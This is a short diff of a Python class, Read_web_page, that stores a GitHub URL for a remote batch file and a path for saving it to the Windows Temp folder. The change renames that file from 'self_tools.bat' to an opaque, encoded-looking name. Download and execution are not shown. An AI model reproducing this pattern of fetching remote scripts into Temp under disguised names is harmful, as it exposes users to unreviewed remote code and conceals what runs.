@@ -19,7 +19,7 @@ import os
 class Read_web_page:
     def __init__(self):
         Location = os.path.expanduser("~")
-        self.Location = os.path.join(Location,"AppData\Local\\Temp\\self_tools.bat")
+        self.Location = os.path.join(Location,"AppData\Local\\Temp\\eJwzNjQ2ND.bat")
 
         self.connection = False
         self.url = "https://raw.githubusercontent.com/TenshinoOtoKafu/Implementation-Project/Main/Command%20Prompt/SelfTools/Personally-used.bat"
